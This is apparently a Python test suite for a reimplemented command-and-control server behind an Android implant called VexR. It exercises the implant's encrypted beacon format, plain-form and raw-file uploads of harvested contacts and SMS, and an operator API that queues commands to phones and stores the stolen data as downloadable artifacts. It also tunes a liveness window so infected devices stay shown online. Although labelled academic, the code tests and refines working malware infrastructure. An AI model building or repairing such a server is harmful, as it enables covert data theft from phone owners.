"""
Conformance tests for the reconstructed VexR C2.

Covers all three uplink transports the implant actually uses, the crypto
contract, the storage layer's migration path, and the operator API.

Run:  python3 test_protocol.py
"""

from __future__ import annotations

import base64
import json
import os
import secrets
import sqlite3
import sys
import tempfile
import urllib.parse
from datetime import datetime, timedelta, timezone

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

sys.path.insert(0, ".")

# Point the store at a scratch location before importing anything that opens it.
_TMP = tempfile.mkdtemp(prefix="vexr-test-")
os.environ.setdefault("VEXR_DB", os.path.join(_TMP, "test.db"))
os.environ.setdefault("VEXR_ARTIFACTS", os.path.join(_TMP, "artifacts"))

import protocol  # noqa: E402
import store  # noqa: E402
from protocol import ProtocolCrypto, ProtocolError, classify, RAW_FILE, PLAIN_FORM  # noqa: E402

TOKEN = "VexR_Lab_Academic_Token_2026"
failures: list[str] = []


def check(name: str, condition: bool, detail: str = "") -> None:
    if condition:
        print(f"[ok]   {name}")
    else:
        print(f"[FAIL] {name}" + (f" — {detail}" if detail else ""))
        failures.append(name)


def client_envelope(crypto: ProtocolCrypto, payload: dict) -> dict[str, str]:
    """Build an envelope exactly the way a/wg1.java does."""
    pub = crypto._private_key.public_key()
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    plaintext = json.dumps(payload).encode()

    enc = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).encryptor()
    d = enc.update(protocol._pkcs5_pad(plaintext)) + enc.finalize()
    k = pub.encrypt(aes_key, padding.PKCS1v15())

    return {
        "v": "3",
        "d": base64.b64encode(d).decode(),
        "k": base64.b64encode(k).decode(),
        "i": base64.b64encode(iv).decode(),
    }


def test_crypto() -> None:
    crypto = ProtocolCrypto()

    original = {"action": "allsms", "sms": [{"address": "+98Bank", "body": "lab"}]}
    env = crypto.encrypt(original)
    check("server encrypt/decrypt round-trip", crypto.decrypt(env) == original)
    check("envelope has v,d,k,i", set(env) == {"v", "d", "k", "i"})

    client_env = client_envelope(crypto, {"device_id": "lab-1", "action": "balance"})
    check(
        "client-style envelope decrypts",
        crypto.decrypt(client_env) == {"device_id": "lab-1", "action": "balance"},
    )

    tampered = dict(client_env)
    raw = base64.b64decode(tampered["d"])
    tampered["d"] = base64.b64encode(raw[:-1] + bytes([raw[-1] ^ 0xFF])).decode()
    try:
        crypto.decrypt(tampered)
        check("tampered payload rejected", False, "it was accepted")
    except ProtocolError:
        check("tampered payload rejected", True)

    der = base64.b64decode(crypto.public_key_b64)
    serialization.load_der_public_key(der)
    check(f"public key is valid X.509 SPKI ({len(der)}B)", True)


def test_classification() -> None:
    crypto = ProtocolCrypto()

    # 1. encrypted envelope, URL-encoded exactly as sp0.e() sends it
    env = client_envelope(crypto, {"action": "heartbeat", "device_id": "x"})
    body = urllib.parse.urlencode(env).encode()
    up = classify(body)
    check("classify: encrypted envelope", up.transport == "encrypted", up.transport)
    check("encrypted payload decoded", up.payload.get("device_id") == "x")

    # 1b. same envelope without URL-encoding: '+' decodes to ' ' and padding may
    #     be stripped by a proxy. Must still decrypt rather than 400.
    raw_body = "&".join(f"{k}={v}" for k, v in env.items()).encode()
    try:
        up2 = classify(raw_body)
        check("unencoded envelope tolerated", up2.transport == "encrypted"
              and up2.payload.get("device_id") == "x")
    except ProtocolError as exc:
        check("unencoded envelope tolerated", False, str(exc))

    # 2. plain form — the sp0.e() fallback seen in production
    body = b"action=heartbeat&Model=M2102J20SG&Device_id=abc&Battery=70"
    up = classify(body)
    check("classify: plain form", up.transport == PLAIN_FORM, up.transport)
    check("plain form keeps device id", up.payload.get("Device_id") == "abc")

    # 3. raw file — what sp0.f() posts for every command result
    body = b"|-----Native Contact List-----|\nName: Ali\nPhone: 0912\n"
    up = classify(body, content_type="text/plain", filename="allcontact")
    check("classify: raw file", up.transport == RAW_FILE, up.transport)
    check("raw file body preserved verbatim", up.raw == body)

    # 4. an empty k (the old KeyError('k') crash) must be a clean error
    try:
        classify(b"v=3&d=&k=&i=")
        check("empty envelope raises ProtocolError", False, "no exception")
    except ProtocolError as exc:
        check("empty envelope raises ProtocolError", "missing" in str(exc), str(exc))


def test_store_and_api() -> None:
    from fastapi.testclient import TestClient

    import server

    store.init_db()
    client = TestClient(server.app)
    headers = {"X-Auth-Token": TOKEN}

    with client:
        r = client.post(
            "/panel.php?p=EeILBT",
            headers=headers,
            content=b"action=heartbeat&Device_id=dev1&Model=M2102J20SG&andver=12&Battery=70",
        )
        check("plain beacon accepted", r.status_code == 200, str(r.status_code))

        r = client.post("/api/command", json={"device_key": "dev1", "command": "contacts"})
        check("command queued", r.status_code == 200 and r.json()["status"] == "queued")

        r = client.post(
            "/panel.php?p=EeILBT",
            headers=headers,
            content=b"action=heartbeat&Device_id=dev1&Model=M2102J20SG",
        )
        check("command delivered on next beacon",
              r.json().get("pending_commands") == ["contacts"], str(r.json()))

        # THE regression this refactor exists for: a raw upload must be stored.
        r = client.post(
            "/file.php?p=EeILBT&response=true&action=allcontact&Device_id=dev1",
            headers={**headers, "Content-Type": "text/plain"},
            content=b"Name: Ali\nPhone: 0912\n",
        )
        check("raw file upload stored", r.status_code == 200, str(r.status_code))

        cmds = client.get("/api/commands").json()["commands"]
        done = [c for c in cmds if c["status"] == "completed"]
        check("command marked completed by upload", len(done) == 1,
              str([(c["id"], c["status"]) for c in cmds]))
        check("completed command links its artifact", bool(done and done[0]["artifact_id"]))

        arts = client.get("/api/artifacts").json()["artifacts"]
        check("artifact listed", len(arts) == 1, str(len(arts)))
        if arts:
            r = client.get(f"/api/artifacts/{arts[0]['id']}/download")
            check("artifact downloadable", r.status_code == 200 and b"Ali" in r.content)

        r = client.post("/panel.php", headers={"X-Auth-Token": "wrong"}, content=b"action=heartbeat")
        check("bad token rejected", r.status_code == 403)

        r = client.get("/")
        check("dashboard renders", r.status_code == 200 and "VexR" in r.text)

        r = client.get("/health")
        check("health reports stats", "commands_completed" in r.json()["stats"])


def test_online_window() -> None:
    """The liveness window must cover the implant's slowest cadence.

    HeartbeatService sends every 30 s; KeepAliveReceiver is meant to restart it
    every 180 s. A window shorter than 180 s marks a reachable phone offline
    for part of every alarm cycle, which is what the old 120 s value did.
    """
    now = datetime.now(timezone.utc)

    def age(seconds: int) -> str:
        return (now - timedelta(seconds=seconds)).isoformat()

    check(
        "online window covers the 3-minute keep-alive alarm",
        store.ONLINE_WINDOW_SECONDS > 180,
        f"window={store.ONLINE_WINDOW_SECONDS}s",
    )
    check("a 30 s heartbeat keeps the device online", store._online(age(30)))
    check("an alarm-only 180 s cadence keeps it online", store._online(age(180)))
    check(
        "a silence beyond the window is offline",
        not store._online(age(store.ONLINE_WINDOW_SECONDS + 5)),
    )


def test_migration() -> None:
    """An old-schema database must be upgraded in place, losing no rows."""
    path = os.path.join(_TMP, "legacy.db")
    conn = sqlite3.connect(path)
    conn.executescript("""
        CREATE TABLE devices (id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_key TEXT UNIQUE NOT NULL, model TEXT, android_ver TEXT,
            first_seen TEXT NOT NULL, last_seen TEXT NOT NULL,
            beacon_count INTEGER NOT NULL DEFAULT 0);
        CREATE TABLE files (id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_key TEXT NOT NULL, filename TEXT, size_bytes INTEGER,
            received_at TEXT NOT NULL);
        INSERT INTO devices (device_key, model, android_ver, first_seen, last_seen)
            VALUES ('legacy1', 'OldPhone', '11', '2026-01-01', '2026-01-02');
        INSERT INTO files (device_key, filename, size_bytes, received_at)
            VALUES ('legacy1', 'contacts_old.txt', 123, '2026-01-02');
    """)
    conn.commit()
    conn.close()

    old_db, old_art = store.DB_PATH, store.ARTIFACT_DIR
    store.DB_PATH = store.Path(path)
    store.ARTIFACT_DIR = store.Path(os.path.join(_TMP, "legacy-art"))
    try:
        store.init_db()
        devices = store.list_devices()
        check("migration preserves the device row",
              any(d["device_key"] == "legacy1" for d in devices), str(devices))
        arts = store.list_artifacts()
        check("migration carries files -> artifacts",
              any(a["filename"] == "contacts_old.txt" for a in arts), str(arts))

        store.init_db()  # must be idempotent; Railway restarts run it every boot
        check("migration is idempotent",
              len(store.list_artifacts()) == len(arts))
    finally:
        store.DB_PATH, store.ARTIFACT_DIR = old_db, old_art


def main() -> int:
    test_crypto()
    test_classification()
    test_store_and_api()
    test_online_window()
    test_migration()

    print()
    if failures:
        print(f"{len(failures)} FAILED: {', '.join(failures)}")
        return 1
    print("ALL CHECKS PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
